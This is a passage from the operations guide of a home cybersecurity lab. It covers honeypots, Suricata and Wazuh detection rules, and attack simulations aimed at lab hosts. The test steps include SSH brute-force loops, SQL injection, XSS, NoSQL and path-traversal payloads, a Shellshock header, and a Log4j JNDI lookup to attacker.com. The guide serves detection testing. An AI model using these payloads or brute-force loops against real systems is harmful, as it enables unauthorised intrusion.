./infra/scripts/simulate-honeypot-attacks.sh
```

**What it does:** Comprehensive attack simulation across all honeypots in 8 sections:

1. SSH Brute Force (Cowrie)
2. Telnet Connection Attempts (Cowrie)
3. Web Application Attacks (Juice Shop, WebGoat)
4. SMB Enumeration (Dionaea)
5. FTP Authentication Attempts (Dionaea)
6. SQL Injection Payloads (MySQL via Dionaea)
7. Port Scanning (All protocols)
8. Low-Rate Distributed Attacks

**Output:** Real-time attack progress with success indicators
**Verify by:** Check Wazuh Dashboard for alerts in real-time

---

#### 2. `test-honeypot-attacks.sh` ⭐ **TARGETED ATTACK TESTING**

```bash
chmod +x infra/scripts/test-honeypot-attacks.sh
./infra/scripts/test-honeypot-attacks.sh
```

**What it does:** Individual, controllable attack tests:

- SSH brute force with credential lists
- Telnet interactive sessions
- HTTP exploit payloads
- SMB enumeration
- FTP file operations
- MySQL query injection
- Port scanning

**Output:** Individual attack results with connection details
**Use case:** When you want to test specific attack vectors

---

#### 3. `test_suricata_rules.sh` ⭐ **RULE VALIDATION**

```bash
chmod +x infra/test_suricata_rules.sh
./infra/test_suricata_rules.sh
```

**What it does:**

- Validates all 400+ Suricata rules are loaded
- Tests EVE JSON output format
- Verifies alert triggering
- Reports performance metrics
- Shows rule statistics by category

**Expected output:**

```
Testing Suricata IDS/IPS Rules...
[✓] Suricata service running
[✓] 400+ custom rules loaded
[✓] EVE JSON generation active
[✓] Alert detection working

Performance:
  Packets/sec: 1,250
  Rules/sec: 42
  Memory: 256MB
```

**Run when:** After deploying or updating Suricata rules

---

#### 4. `verify-honeypots.sh` ⭐ **HONEYPOT HEALTH CHECK**

```bash
chmod +x infra/scripts/verify-honeypots.sh
./infra/scripts/verify-honeypots.sh
```

**What it does:**

1. Checks all honeypot containers running
2. Tests network accessibility on all ports
3. Verifies log file generation
4. Validates Wazuh integration
5. Tests Traefik routing
6. Shows performance metrics
7. Runs live SSH attack simulation
8. Checks database connectivity

**Output:** Detailed checklist with ✓/✗ for each component
**Success criteria:** All items should show ✓

---

#### 5. `verify-wazuh-honeypot-integration.sh` ⭐ **WAZUH INTEGRATION CHECK**

```bash
chmod +x infra/scripts/verify-wazuh-honeypot-integration.sh
./infra/scripts/verify-wazuh-honeypot-integration.sh
```

**What it does:**

1. Validates Wazuh Manager operational
2. Checks log file paths configured
3. Verifies logs flowing to Wazuh
4. Confirms decoder activation
5. Validates rule loading (100+ honeypot rules)
6. Tests alert generation
7. Verifies dashboard accessibility
8. Provides alert statistics

**Output:** Integration status with real alert counts
**Use case:** Verify end-to-end log flow before testing

---

#### 6. `verify-network-access.sh` **NETWORK CONNECTIVITY**

```bash
chmod +x infra/scripts/verify-network-access.sh
./infra/scripts/verify-network-access.sh
```

**What it does:**

- Tests service-to-service connectivity
- Validates access control policies
- Checks network routing
- Identifies connectivity issues

**Use case:** Troubleshooting network-related issues

---

#### 7. `verify-dns-monitoring.sh` **DNS FUNCTIONALITY**

```bash
chmod +x infra/scripts/verify-dns-monitoring.sh
./infra/scripts/verify-dns-monitoring.sh
```

**What it does:**

- Validates DNS resolution
- Tests DNS queries across networks
- Checks DNS console functionality
- Verifies DNS logging

**Use case:** Ensure DNS infrastructure working

---

#### 8. `test-dns-advanced.py` **ADVANCED DNS TESTING**

```bash
chmod +x infra/scripts/test-dns-advanced.py
python3 infra/scripts/test-dns-advanced.py

# Export results to JSON
python3 infra/scripts/test-dns-advanced.py --export dns-results.json

# View configuration
python3 infra/scripts/test-dns-advanced.py --config
```

**What it does:**

- Comprehensive DNS testing across all networks
- Response time analysis
- Record validation
- Network segmentation testing

**Use case:** Detailed DNS diagnostics

---

### Infrastructure & Deployment Scripts

#### 9. `init-openvpn.sh` / `init-openvpn.ps1` **VPN INITIALIZATION**

```bash
# macOS/Linux
cd infra/scripts
chmod +x init-openvpn.sh
./init-openvpn.sh

# Windows PowerShell (Run as Administrator)
cd infra\scripts
.\init-openvpn.ps1
```

**What it does:**

- Initializes OpenVPN Access Server
- Sets admin credentials
- Generates client profiles
- Configures VPN routing

**Run when:** Fresh deployment or VPN reset needed

---

#### 10. `seed-ldap.sh` **LDAP DIRECTORY POPULATION**

```bash
chmod +x infra/scripts/seed-ldap.sh
./infra/scripts/seed-ldap.sh
```

**What it does:**

- Creates base LDAP directory structure
- Adds admin user
- Creates security_team group
- Adds test users for access control

**Run when:** Initial LDAP setup or after factory reset

---

#### 11. `init-dns-tools.sh` **DNS SERVER INITIALIZATION**

```bash
chmod +x infra/scripts/init-dns-tools.sh
./infra/scripts/init-dns-tools.sh
```

**What it does:**

- Configures Technitium DNS server
- Sets up DNS zones
- Adds DNS records for all services
- Initializes DNS console

**Run when:** Fresh DNS deployment

---

#### 12. `generate-passwords.sh` **SECURE PASSWORD GENERATION**

```bash
chmod +x infra/scripts/generate-passwords.sh
./infra/scripts/generate-passwords.sh
```

**What it does:**

- Generates cryptographically secure passwords
- Stores in `infra/secrets/`
- Updates environment files

**Output:** Password files in `infra/secrets/`
**Run before:** Initial deployment to set secure credentials

---

#### 13. `setup-workstation-gateway.sh` / `.ps1` **WORKSTATION SETUP**

```bash
# macOS/Linux
chmod +x infra/scripts/setup-workstation-gateway.sh
./infra/scripts/setup-workstation-gateway.sh

# Windows PowerShell
.\infra\scripts\setup-workstation-gateway.ps1
```

**What it does:**

- Configures workstation container
- Sets up remote desktop access
- Installs security tools

**Run when:** Need to use workstation VM

---

#### 14. `neuvector/allow-host-access.sh` **NEUVECTOR SECURITY POLICY**

```bash
chmod +x infra/scripts/neuvector/allow-host-access.sh
./infra/scripts/neuvector/allow-host-access.sh
```

**What it does:**

- Configures NeuVector security policies
- Allows necessary host communication
- Sets up network policies

---

### Quick Script Execution Matrix

| Use Case                    | Script                                             | Frequency            |
| --------------------------- | -------------------------------------------------- | -------------------- |
| **Initial Setup**           | seed-ldap.sh + init-dns-tools.sh + init-openvpn.sh | Once per deployment  |
| **Test Individual Attacks** | test-honeypot-attacks.sh                           | On-demand            |
| **Run Full Attack Suite**   | simulate-honeypot-attacks.sh                       | Weekly/Testing       |
| **Verify System Health**    | verify-honeypots.sh                                | Before testing       |
| **Check SIEM Integration**  | verify-wazuh-honeypot-integration.sh               | After changes        |
| **Test IDS Rules**          | test_suricata_rules.sh                             | After rule updates   |
| **Network Diagnostics**     | verify-network-access.sh                           | When troubleshooting |
| **DNS Testing**             | test-dns-advanced.py                               | On-demand            |
| **Reset Passwords**         | generate-passwords.sh                              | Security rotation    |

---

## Running Scripts

### DNS Testing

**Basic DNS Testing Across All Networks:**

```bash
cd infra/scripts
chmod +x test-dns.sh
./test-dns.sh all
```

Test specific network:

```bash
./test-dns.sh external    # Layer 1
./test-dns.sh internal    # Layer 3
./test-dns.sh security    # Layer 4
./test-dns.sh management  # Layer 5
./test-dns.sh dns-console # DNS web UI
```

**Advanced DNS Testing with Diagnostics:**

```bash
cd infra/scripts
chmod +x test-dns-advanced.py
python3 test-dns-advanced.py
```

Export results to JSON:

```bash
python3 test-dns-advanced.py --export dns-results.json
```

View configuration:

```bash
python3 test-dns-advanced.py --config
```

### Network Verification

```bash
cd infra/scripts
chmod +x verify-network-access.sh
./verify-network-access.sh
```

This validates:

- Service-to-service connectivity
- Access control policies
- Network routing
- Identifies connectivity issues

### Backup Operations

**Automatic Backup:**

- Runs daily at 02:00 UTC
- 30-day retention policy
- All volumes backed up

**Manual Backup:**

```bash
# Create manual backup
docker exec backup tar -czf "/backups/manual-$(date +%Y%m%d_%H%M%S).tar.gz" /backup/

# List backups
docker exec backup ls -lh /backups/

# Restore from backup
docker exec backup tar -xzf "/backups/manual-YYYYMMDD_HHMMSS.tar.gz" -C /backup/
```

### Database Operations

**PostgreSQL:**

```bash
# Connect to PostgreSQL
docker exec postgresql psql -U postgres -c "SELECT version();"

# List databases
docker exec postgresql psql -U postgres -c "\l"

# Create database
docker exec postgresql psql -U postgres -c "CREATE DATABASE myapp;"
```

**MongoDB:**

```bash
# Connect to MongoDB
docker exec mongodb mongosh -u root -p $MONGODB_PASSWORD

# List databases
docker exec mongodb mongosh -u root -p $MONGODB_PASSWORD --eval "db.adminCommand('listDatabases')"
```

### LDAP Operations

**Search LDAP Directory:**

```bash
# Search all users
docker exec openldap ldapsearch -b "dc=cyberlab,dc=local" -x

# Search specific user
docker exec openldap ldapsearch -b "cn=admin,dc=cyberlab,dc=local" -x

# List all users
docker exec openldap ldapsearch -b "ou=users,dc=cyberlab,dc=local" -x
```

**Modify LDAP:**

```bash
# Change admin password
docker exec openldap ldappasswd -D "cn=admin,dc=cyberlab,dc=local" -W -S "uid=newuser,ou=users,dc=cyberlab,dc=local"
```

---

## Service-Specific Configuration & Testing

### Suricata IDS/IPS (400+ Custom Rules)

#### Overview

Suricata is a powerful network intrusion detection and prevention system with 400+ custom rules covering:

- **Database Attacks** (MySQL, PostgreSQL, MongoDB, Redis, MSSQL)
- **Web Application Attacks** (SQLi, XSS, RFI/LFI, Command Injection)
- **Protocol Attacks** (SSH, FTP, RDP, SMB, Kerberos, LDAP)
- **VPN & Remote Access** (OpenVPN, IPsec, VNC)
- **Infrastructure/Cloud** (Docker, Kubernetes, AWS)
- **Malware & C2** (Trojans, Ransomware, Botnets)
- **Specific CVEs** (Heartbleed, Shellshock, Log4j, ProxyLogon, Spring4Shell)

#### Configuration Files

```
infra/configs/suricata/
├── suricata.yaml          # Main Suricata configuration
├── suricata.rules         # 400+ custom detection rules
└── rule-sets/             # Organized rules by category
```

#### Testing Suricata Rules

**1. Validate Rule Loading:**

```bash
# Check Suricata service
docker exec suricata suricata -T -c /etc/suricata/suricata.yaml

# Verify EVE output
docker exec suricata tail -f /var/log/suricata/eve.json | head -10 | jq .
```

**2. Test Specific Attack Categories:**

```bash
# Generate SQLi traffic to test rules
curl "http://10.10.20.80/api/products?q=1' UNION SELECT NULL--"

# Generate XSS traffic
curl "http://10.10.20.80/?search=<script>alert('xss')</script>"

# Generate malware signature traffic
curl --data "eicar=X5O!P%@AP[4\\PZX54(P^)7CC" http://10.10.20.80/upload

# Generate port scan traffic (from another machine)
nmap -sV -p 21,445,1433,3306,3389 10.10.20.71
```

**3. Monitor Suricata Alerts in Real-Time:**

```bash
# View all alerts
docker exec suricata tail -f /var/log/suricata/eve.json | jq 'select(.event_type=="alert")'

# Filter by severity (1=Critical, 2=Major, 3=Minor)
docker exec suricata tail -f /var/log/suricata/eve.json | \
  jq 'select(.alert.severity==1)'

# Count alerts by signature
docker exec suricata jq -r '.alert.signature' /var/log/suricata/eve.json | \
  sort | uniq -c | sort -rn | head -10
```

**4. View Suricata Statistics:**

```bash
docker exec suricata tail -f /var/log/suricata/stats.json | jq '.[] | {timestamp, decode, http}'
```

#### Rule Update & Management

**Add Custom Rules:**

```bash
# Edit Suricata rules
nano infra/configs/suricata/suricata.rules

# Add new rule (example):
# alert http any any -> any 80 (msg:"Custom Detection";
#   content:"malicious_payload"; sid:999999; rev:1;)

# Reload rules
docker-compose restart suricata
```

**Test Rule Changes:**

```bash
# Validate syntax
docker exec suricata suricata -T -c /etc/suricata/suricata.yaml

# Check for errors
docker logs suricata 2>&1 | grep -i "error\|warning"
```

---

### Wazuh SIEM - Log Analysis & Threat Detection

#### Overview

Wazuh 4.14.1 with 400+ custom rules for honeypots and network IDS integration:

- Real-time log analysis from all 20 services
- Correlation engine for multi-stage attacks
- Live dashboard with threat indicators
- Custom webapp decoders for Juice Shop & WebGoat

#### Configuration Files

```
infra/configs/wazuh/
├── wazuh_cluster/
│   └── wazuh_manager.conf     # SIEM configuration & log sources
├── suricata_rules.xml         # 300+ Suricata integration rules
├── webapp_rules.xml           # 100+ web app honeypot rules
├── webapp_decoders.xml        # Custom decoders for web apps
└── wazuh_indexer_ssl_certs/   # SSL certificates
```

#### Testing Wazuh Integration

**1. Verify Wazuh is Processing Logs:**

```bash
# Check if Wazuh manager is healthy
docker exec wazuh.manager /var/ossec/bin/wazuh-control status

# Monitor real-time alert generation
docker exec wazuh.manager tail -f /var/ossec/logs/alerts/alerts.json | jq .

# Count alerts by type
docker exec wazuh.manager jq -r '.rule.description' /var/ossec/logs/alerts/alerts.json | \
  sort | uniq -c | sort -rn | head -15
```

**2. Test Custom Honeypot Rules:**

```bash
# Generate SSH brute force alert
for i in {1..5}; do
  timeout 1 ssh -o StrictHostKeyChecking=no root@10.10.20.70 -p 2222 &
done
wait

# Check Wazuh captured it
docker exec wazuh.manager grep -i "ssh.*brute" /var/ossec/logs/alerts/alerts.json | \
  tail -1 | jq '{rule: .rule.description, severity: .rule.level, agent: .agent.name}'
```

**3. Monitor Wazuh Dashboard:**

```
Visit: https://wazuh.cyberlab.local
Username: kibanaserver
Password: kibanaserver
```

Dashboard Features:

- **Main Dashboard** - Overview of all alerts
- **Threat Detection** - Security events by type
- **Honeypots** - Attacks captured by each honeypot
- **Suricata IDS** - Network-level threat detection
- **Compliance** - Security policy violations

**4. Advanced Wazuh Queries (Lucene):**

```
# All honeypot attacks
group:"honeypot*"

# SSH attacks only
group:"ssh_attack"

# High-severity events (level 8+)
rule.level:[8 TO 10]

# Attacks from specific IP
data.srcip:"10.10.0.50"

# Database attacks
group:"db_attack"

# Web application attacks
group:"webapp_attack" AND group:"sql_injection"

# Last 24 hours
timestamp:[now-24h TO now]
```

---

### NeuVector Container Security

#### Overview

Real-time container threat detection and vulnerability scanning:

- Runtime threat protection
- Network policy enforcement
- Vulnerability scanning for images
- Container isolation capabilities

#### Configuration & Testing

**1. Access NeuVector Dashboard:**

```
https://neuvector.cyberlab.local:8443
Username: admin
Password: admin
(Change password on first login!)
```

**2. Basic Health Check:**

```bash
# Check NeuVector controller status
docker exec neuvector.controller curl -s http://localhost:10443/v1/health | jq .

# View container threat detection
docker logs neuvector.controller | tail -50 | grep -i "threat\|vulnerability\|policy"
```

**3. Test Container Scanning:**

```bash
# Trigger vulnerability scan on juice-shop image
docker inspect bkimminich/juice-shop:latest | grep -i repolags

# View scan results in NeuVector console
# Navigate to: Vulnerabilities > Images
```

**4. Monitor Container Behavior:**

```bash
# View network policy violations
docker logs neuvector.controller | grep -i "policy.*violation"

# Check process anomalies
docker logs neuvector.controller | grep -i "process.*attack\|anomal"
```

---

### OpenVPN Access & Gateway Configuration

#### Overview

Secure remote access with OpenVPN Access Server:

- Remote client profiles available
- Admin panel for user management
- Two-factor authentication support

#### Testing VPN Access

**1. Access OpenVPN Admin Panel:**

```
https://vpn.cyberlab.local:943/admin
Username: openvpn
Password: (from infra/secrets/openvpn_admin_password)
```

**2. Generate Client Certificate:**

```bash
docker exec openvpn ovpn_getclient user1 > /tmp/user1.ovpn

# Test connection
openvpn /tmp/user1.ovpn

# From another machine:
curl http://10.10.20.80 # Should reach internal services via VPN
```

**3. Monitor VPN Connections:**

```bash
# View active connections
docker exec openvpn tail -f /var/log/openvpn/openvpn.log

# Check connected clients
docker exec openvpn cat /etc/openvpn/as.conf | grep -i "client"
```

---

### OpenLDAP Directory Service Testing

#### Overview

Enterprise directory service for identity management and authentication:

- Centralized user management
- Group-based access control
- Secure credential storage

#### Configuration & Testing

**1. Test LDAP Connectivity:**

```bash
# Query all users
docker exec openldap ldapsearch -b "dc=cyberlab,dc=local" -x | head -30

# Search specific user
docker exec openldap ldapsearch -b "uid=admin,ou=users,dc=cyberlab,dc=local" -x

# Test bind with credentials
docker exec openldap ldapwhoami -D "cn=admin,dc=cyberlab,dc=local" -w admin
```

**2. Access LDAP Admin UI:**

```
https://ldap.cyberlab.local/
Username: cn=admin,dc=cyberlab,dc=local
Password: admin
```

**3. Modify LDAP Directory:**

```bash
# Add new user
docker exec openldap ldapadd -D "cn=admin,dc=cyberlab,dc=local" -w admin << EOF
dn: uid=testuser,ou=users,dc=cyberlab,dc=local
objectClass: inetOrgPerson
uid: testuser
cn: Test User
sn: User
userPassword: TestPassword123
EOF
```

---

### PostgreSQL Database Testing

#### Overview

Relational database for application data storage:

- Full ACID compliance
- JSON support
- Row-level security

#### Testing Database

**1. Connect to PostgreSQL:**

```bash
# Interactive shell
docker exec -it postgresql psql -U postgres

# From command line
docker exec postgresql psql -U postgres -c "SELECT version();"
```

**2. Create Test Database:**

```bash
docker exec postgresql psql -U postgres << EOF
CREATE DATABASE testlab;
CREATE USER testuser WITH PASSWORD 'SecurePass123';
GRANT ALL PRIVILEGES ON DATABASE testlab TO testuser;
EOF
```

**3. Test SQL Injection Detection:**

```bash
# Generate SQL error that Suricata detects
docker exec postgresql psql -U postgres -d testlab \
  -c "SELECT * FROM users WHERE id='1' OR '1'='1'--"

# Check if Wazuh/Suricata captured the pattern
docker exec wazuh.manager grep -i "sql" /var/ossec/logs/alerts/alerts.json | tail -1
```

---

### MongoDB NoSQL Database Testing

#### Overview

Document-oriented database for flexible data storage:

- NoSQL query language
- Horizontal scalability
- Aggregation pipeline support

#### Testing MongoDB

**1. Connect to MongoDB:**

```bash
# Interactive shell
docker exec -it mongodb mongosh -u root -p $MONGODB_PASSWORD

# From command line
docker exec mongodb mongosh -u root -p ${MONGODB_PASSWORD} \
  --eval "db.adminCommand('listDatabases')"
```

**2. Create Test Collection:**

```bash
docker exec mongodb mongosh -u root -p ${MONGODB_PASSWORD} << EOF
use testlab
db.createCollection("users")
db.users.insertOne({name: "Test User", email: "test@cyberlab.local"})
db.users.find()
EOF
```

**3. Test NoSQL Injection Detection:**

```bash
# Send NoSQL injection payload (would be detected if sent via web app)
# Example: {"$ne": ""} in query parameters
curl "http://10.10.20.80/api/users?filter={\$ne:''}"

# Check Wazuh alerts
docker exec wazuh.manager grep -i "nosqli\|mongodb" /var/ossec/logs/alerts/alerts.json | tail -1
```

---

### Rocket.Chat Communication Platform

#### Overview

Team collaboration platform for internal communication:

- Real-time messaging
- Channel-based organization
- File sharing

#### Testing

**1. Access Rocket.Chat:**

```
https://rocketchat.cyberlab.local
```

**2. Create Account & Team:**

```bash
# First user created during initial setup becomes admin
# Create additional users for testing
# Set up channels for different teams/departments
```

**3. Monitor Communication:**

```bash
# Check logs for security events
docker logs rocketchat | tail -50 | grep -i "error\|warning\|failed"

# View authentication attempts
docker exec rocketchat grep -i "login\|auth" /var/log/rocketchat/rocketchat.log | tail -20
```

---

### Juice Shop - OWASP Vulnerable Web Application

#### Overview

Intentionally vulnerable e-commerce application for security training:

- OWASP Top 10 vulnerabilities
- SQL injection, XSS, path traversal
- Broken authentication, access control

#### Testing Juice Shop

**1. Access Application:**

```
https://juice-shop.cyberlab.local/
```

**2. Automated Vulnerability Scanning:**

```bash
# Use OWASP ZAP for automated scanning
docker run -it --rm -v $(pwd):/zap/wrk:rw --net host \
  owasp/zap2docker-stable zap-baseline.py \
  -t https://juice-shop.cyberlab.local -r /zap/wrk/juice-shop-report.html
```

**3. Manual Exploitation Testing:**

```bash
# Test 1: SQL Injection
curl -s "https://juice-shop.cyberlab.local/api/products?q=1' UNION SELECT NULL--" \
  -k | jq .

# Test 2: Authentication Bypass
curl -s -X POST "https://juice-shop.cyberlab.local/api/users/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juiceshop.cyberlab.local","password":"admin","rememberMe":true}' \
  -k | jq .

# Test 3: Path Traversal
curl -s "https://juice-shop.cyberlab.local/assets/../../../../../../etc/passwd" -k

# Test 4: BOLA (Broken Object Level Authorization)
curl -s "https://juice-shop.cyberlab.local/api/users/2" -k | jq .
```

**4. Verify Wazuh Detection:**

```bash
docker exec wazuh.manager grep -i "juice" /var/ossec/logs/alerts/alerts.json | \
  jq '{attack: .rule.description, severity: .rule.level}' | tail -5
```

**5. Monitor in Wazuh Dashboard:**

```
Search: group:"webapp_attack" AND agent.name:"juice-shop"
```

---

### WebGoat - OWASP Web Security Training

#### Overview

Interactive training platform for web application security:

- Guided lessons for each vulnerability type
- Hands-on exploitation exercises
- Solutions and explanations

#### Testing WebGoat

**1. Access Training Platform:**

```
https://webgoat.cyberlab.local:8443/
(Default: No authentication required for training)
```

**2. Complete Lessons:**

```
Recommended learning path:
1. General: HTTP Basics
2. General: Request/Response
3. A1: Injection
4. A2: Authentication
5. A3: Sensitive Data
6. A4: XML External Entities (XXE)
7. A5: Broken Access Control
8. A6: Security Misconfiguration
```

**3. Monitor Training Activity:**

```bash
# View WebGoat logs
docker logs webgoat | tail -50

# Check lesson completion tracking
docker exec webgoat grep -i "lesson\|completed" /var/log/webgoat/webgoat.log | tail -10
```

**4. Verify Wazuh Captures Training Attempts:**

```bash
docker exec wazuh.manager grep -i "webgoat" /var/ossec/logs/alerts/alerts.json | \
  jq '{lesson: .data.lesson, level: .rule.level}' | tail -5
```

---

### Cowrie SSH/Telnet Honeypot

#### Overview

Interactive SSH and Telnet honeypot:

- Captures login attempts and commands
- Logs malicious activity in JSON format
- Simulates vulnerable SSH server

#### Advanced Cowrie Testing

**1. Monitor Cowrie Activity in Real-Time:**

```bash
# Watch all connections
docker logs -f cowrie

# Parse JSON logs
docker exec cowrie tail -f /var/log/cowrie/cowrie.json | jq .

# Count failed login attempts
docker exec cowrie jq -r '.eventid' /var/log/cowrie/cowrie.json | \
  grep -c "cowrie.login.failed"
```

**2. Test Brute Force Detection:**

```bash
# Generate 50 failed login attempts
for i in {1..50}; do
  timeout 1 ssh -o StrictHostKeyChecking=no \
    "root@10.10.20.70" -p 2222 2>/dev/null || true
  sleep 0.1
done

# Verify Wazuh alert
docker exec wazuh.manager grep -c "SSH.*brute" /var/ossec/logs/alerts/alerts.json
```

**3. Extract Captured Data:**

```bash
# List all captured commands
docker exec cowrie jq -r 'select(.eventid=="cowrie.command.input") | .input' \
  /var/log/cowrie/cowrie.json

# Find credential attempts
docker exec cowrie jq -r 'select(.eventid=="cowrie.login.failed") | {user:.username, pass:.password}' \
  /var/log/cowrie/cowrie.json
```

---

### Dionaea Multi-Protocol Honeypot

#### Overview

Captures attacks on multiple network protocols:

- FTP, SMB, MSSQL, MySQL, RDP, HTTP

#### Advanced Dionaea Testing

**1. Monitor Dionaea Activity:**

```bash
# Watch all protocols
docker logs -f dionaea

# Parse JSON events
docker exec dionaea tail -f /var/log/dionaea/dionaea.json | jq .

# View incident reports
docker exec dionaea cat /var/log/dionaea/incidents.log
```

**2. Test FTP Exploitation:**

```bash
# Attempt anonymous FTP
timeout 2 ftp -n 10.10.20.71 << EOF
user anonymous anonymous
ls
quit
EOF

# Check captured attempt
docker exec dionaea jq 'select(.protocol=="ftp")' /var/log/dionaea/dionaea.json
```

**3. Test SMB Enumeration:**

```bash
# Enumerate SMB shares (Linux)
smbclient -N -L //10.10.20.71 2>/dev/null

# Attempt share connection
smbclient //10.10.20.71/share -N 2>/dev/null

# Check captured activity
docker exec dionaea jq 'select(.protocol=="smb")' /var/log/dionaea/dionaea.json
```

**4. Test MySQL Exploitation:**

```bash
# Attempt MySQL connection
timeout 2 mysql -h 10.10.20.71 -u root -p"password" -e "SELECT 1" 2>/dev/null || true

# Check captured credentials
docker exec dionaea jq 'select(.protocol=="mysql") | {user:.username, pass:.password}' \
  /var/log/dionaea/dionaea.json
```

---

### Traefik Reverse Proxy & Load Balancing

#### Overview

Advanced routing with security policies and load balancing:

- Service discovery and routing
- SSL/TLS termination
- Access control middleware

#### Testing Traefik

**1. Access Traefik Dashboard:**

```
https://traefik.cyberlab.local:8082/dashboard/
```

**2. Verify Service Routing:**

```bash
# Test routing to each service
curl -k https://wazuh.cyberlab.local/ -I
curl -k https://juice-shop.cyberlab.local/ -I
curl -k https://neuvector.cyberlab.local:8443/ -I

# Check DNS resolution
nslookup traefik.cyberlab.local
nslookup wazuh.cyberlab.local
```

**3. Monitor Traefik Logs:**

```bash
# View access logs
docker logs traefik | grep "access"

# Monitor routing decisions
docker logs traefik | grep "route\|backend\|frontend"

# Check middleware application
docker logs traefik | grep "middleware"
```

**4. Test Access Control Policies:**

```bash
# Try to access admin panel from wrong network
curl -k https://traefik.cyberlab.local:8082/dashboard/ \
  --header "X-Forwarded-For: 192.168.1.100" -I
# Should be denied

# Try from allowed network
curl -k https://traefik.cyberlab.local:8082/dashboard/ -I
# Should succeed if you're on management network
```

---

## Complete End-to-End Attack Simulation Scenarios

### Scenario 1: Multi-Stage Reconnaissance & Exploitation

**Objective:** Simulate a complete attack chain from reconnaissance to data exfiltration

**Step 1: Initial Network Reconnaissance**

```bash
# Scan for open ports on honeypots
nmap -sV -p- 10.10.20.70 10.10.20.71 2>/dev/null

# View alerts in Wazuh
docker exec wazuh.manager grep -i "scan\|reconnaissance" /var/ossec/logs/alerts/alerts.json | \
  jq '.rule.description' | tail -10
```

**Step 2: SSH Enumeration (Cowrie Honeypot)**

```bash
# Attempt SSH connection
ssh -v -o ConnectTimeout=2 admin@10.10.20.70 -p 2222 2>&1 | head -10

# Observe Cowrie interaction log
docker exec cowrie tail -20 /var/log/cowrie/cowrie.json | \
  jq 'select(.eventid=="cowrie.connection.new")'
```

**Step 3: Brute Force Attack**

```bash
# Run brute force with common credentials
for user in admin root operator test; do
  for pass in admin123 password123 root root1234; do
    timeout 1 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
      "$user@10.10.20.70" -p 2222 "whoami" 2>/dev/null &
  done
done
wait

# Check Wazuh detection
docker exec wazuh.manager tail -f /var/ossec/logs/alerts/alerts.json | \
  jq 'select(.rule.level>=8) | {description: .rule.description, count: 1}' | \
  head -5
```

**Step 4: Web Application Exploitation (Juice Shop)**

```bash
# Attempt SQL injection on API
curl -s "https://juice-shop.cyberlab.local/api/products?q=1' OR '1'='1" -k | \
  jq '.products | length'

# Bypass authentication
curl -s -X POST "https://juice-shop.cyberlab.local/api/users/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juiceshop.local","password":"admin"}' -k | \
  jq '.token'

# XSS payload injection
curl -s "https://juice-shop.cyberlab.local/api/reviews?message=<img src=x onerror='alert(1)'>" -k
```

**Step 5: Verify Detection Across All Systems**

```bash
# Suricata IDS alerts
docker exec suricata jq '.alert.signature' /var/log/suricata/eve.json 2>/dev/null | \
  sort | uniq -c | sort -rn

# Wazuh SIEM alerts
docker exec wazuh.manager jq -r '.rule.description' /var/ossec/logs/alerts/alerts.json | \
  grep -i "brute\|injection\|sql\|xss" | sort | uniq -c

# Honeypot logs
docker logs cowrie 2>&1 | tail -20
docker logs juice-shop 2>&1 | tail -20
```

**Expected Alert Flow:**

```
Port Scan Detected
    ↓
SSH Authentication Attempts
    ↓
SSH Brute Force Alert (Level 9)
    ↓
Web Application Scan
    ↓
SQL Injection Attempt (Level 8)
    ↓
XSS Payload Detected (Level 7)
    ↓
Summary Alert: "Coordinated Attack Detected" (Level 10)
```

---

### Scenario 2: Protocol-Level Exploitation (Dionaea)

**Objective:** Exploit multiple protocols to test comprehensive honeypot detection

**Step 1: FTP Enumeration and Login**

```bash
# Attempt anonymous FTP
ftp -n 10.10.20.71 << EOF
user anonymous anything
ls
quit
EOF

# Attempt credential brute force
for pass in ftp password123 admin; do
  timeout 2 ftp -n 10.10.20.71 << EOF
user ftp $pass
quit
EOF
done

# Check Dionaea logs
docker exec dionaea jq 'select(.protocol=="ftp")' /var/log/dionaea/dionaea.json | head -5
```

**Step 2: SMB Share Discovery**

```bash
# Enumerate SMB shares
smbclient -L //10.10.20.71 -N 2>/dev/null || true

# Attempt SMB mount
sudo mount -t cifs //10.10.20.71/share /mnt/smb -o guest 2>/dev/null || true

# Check captured activity
docker exec dionaea jq 'select(.protocol=="smb")' /var/log/dionaea/dionaea.json
```

**Step 3: Database Access Attempts**

```bash
# MySQL connection attempt
timeout 2 mysql -h 10.10.20.71 -u root -p"password" \
  -e "SELECT USER(), VERSION();" 2>/dev/null || true

# MSSQL connection (if sqlcmd available)
timeout 2 sqlcmd -S 10.10.20.71 -U sa -P password \
  -Q "SELECT @@VERSION" 2>/dev/null || true

# Check captured credentials
docker exec dionaea jq '.username, .password' /var/log/dionaea/dionaea.json | \
  paste - - | sort -u
```

**Step 4: RDP Reconnaissance**

```bash
# RDP scan (from Linux)
nmap -sV -p 3389 10.10.20.71 2>/dev/null

# Or from Windows: mstsc.exe 10.10.20.71:3389
```

**Step 5: Verify Dionaea Capture**

```bash
# View incident summary
docker exec dionaea cat /var/log/dionaea/incidents.log

# Count attacks by protocol
docker exec dionaea jq -r '.protocol' /var/log/dionaea/dionaea.json | \
  sort | uniq -c

# View captured payloads
docker exec dionaea jq -r '.payload' /var/log/dionaea/dionaea.json 2>/dev/null | \
  grep -v "null" | head -10
```

---

### Scenario 3: Zero-Day and CVE-Specific Testing

**Objective:** Test detection of known vulnerability signatures

**Step 1: Log4j RCE Simulation (CVE-2021-44228)**

```bash
# Generate Log4j JNDI lookup attempt
curl -s "http://10.10.20.80/" \
  -H 'User-Agent: ${jndi:ldap://attacker.com/a}' \
  -H 'X-Api-Version: ${jndi:ldap://attacker.com/a}' 2>/dev/null

# Check Suricata detection
docker exec suricata jq 'select(.alert.signature | contains("Log4j"))' \
  /var/log/suricata/eve.json
```

**Step 2: Spring4Shell Detection (CVE-2022-22965)**

```bash
# Spring4Shell payload attempt
curl -s -X POST "http://10.10.20.80/api/users" \
  -H "Content-Type: application/json" \
  -d '{"class.modules[0].resourceLoader.paths[0]=fsfsfsfs"}' 2>/dev/null

# Check for detection
docker exec suricata jq 'select(.alert.signature | contains("Spring"))' \
  /var/log/suricata/eve.json
```

**Step 3: Shellshock (CVE-2014-6271) Simulation**

```bash
# CGI environment variable injection
curl -s "http://10.10.20.80/cgi-bin/test.sh" \
  -H "User-Agent: () { :; }; /bin/touch /tmp/pwned" 2>/dev/null || true

# Check detection
docker exec suricata jq 'select(.alert.signature | contains("Shellshock"))' \
  /var/log/suricata/eve.json
```

**Step 4: Verify CVE Detection in Wazuh**

```bash
docker exec wazuh.manager grep -i "cve\|shellshock\|log4j\|spring" \
